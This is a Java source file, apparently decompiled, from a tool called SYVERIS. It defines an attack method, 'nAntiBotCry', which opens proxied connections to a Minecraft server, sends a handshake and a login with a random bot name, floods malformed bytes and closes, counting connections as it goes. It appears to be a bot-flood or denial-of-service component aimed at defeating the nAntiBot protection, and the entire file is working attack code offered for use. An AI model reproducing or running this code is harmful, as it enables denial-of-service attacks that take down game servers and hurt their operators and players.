package IO.SYVERIS.methods;

import IO.SYVERIS.Main;
import IO.SYVERIS.utils.Handshake;
import IO.SYVERIS.utils.LoginRequest;
import IO.SYVERIS.utils.NettyBootstrap;
import IO.SYVERIS.utils.ProxyLoader;
import io.netty.buffer.ByteBuf;
import io.netty.buffer.ByteBufOutputStream;
import io.netty.buffer.Unpooled;
import io.netty.channel.Channel;
import java.security.SecureRandom;

public class nAntiBotCry implements Method {
   private Handshake handshake;
   private byte[] bytes;

   public nAntiBotCry() {
      this.handshake = new Handshake(Main.protcolID, Main.srvRecord, Main.port, 2);
      this.bytes = this.handshake.getWrappedPacket();
   }

   public void accept(Channel channel, ProxyLoader.Proxy proxy) {
      ByteBuf b = Unpooled.buffer();
      ByteBufOutputStream out = new ByteBufOutputStream(b);

      try {
         out.write(this.bytes);
         SecureRandom var10003 = new SecureRandom();
         out.write((new LoginRequest("syveris" + var10003.nextInt(99999))).getWrappedPacket());
         out.write(666);
         out.write(666);
         out.write(666);
         out.write(666);
         out.write(666);
         out.write(666);

         for(int i = 0; i < 100; ++i) {
            out.write(666);
            out.write(1);
         }
      } catch (Exception var6) {
      }

      channel.writeAndFlush(b);
      channel.writeAndFlush(out);
      ++NettyBootstrap.integer;
      ++NettyBootstrap.totalConnections;
      channel.close();
   }
}
